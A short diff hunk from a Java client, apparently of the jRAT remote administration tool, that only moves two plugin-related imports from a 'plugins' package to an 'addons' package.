@@ -34,10 +34,10 @@ import javax.swing.table.DefaultTableModel;
 
 import su.jrat.client.Constants;
 import su.jrat.client.ErrorDialog;
+import su.jrat.client.addons.OnlinePlugin;
+import su.jrat.client.addons.PluginInstaller;
 import su.jrat.client.listeners.ExtensionInstallerListener;
 import su.jrat.client.net.WebRequest;
-import su.jrat.client.plugins.OnlinePlugin;
-import su.jrat.client.plugins.PluginInstaller;
 import su.jrat.client.ui.dialogs.DialogImage;
 
 
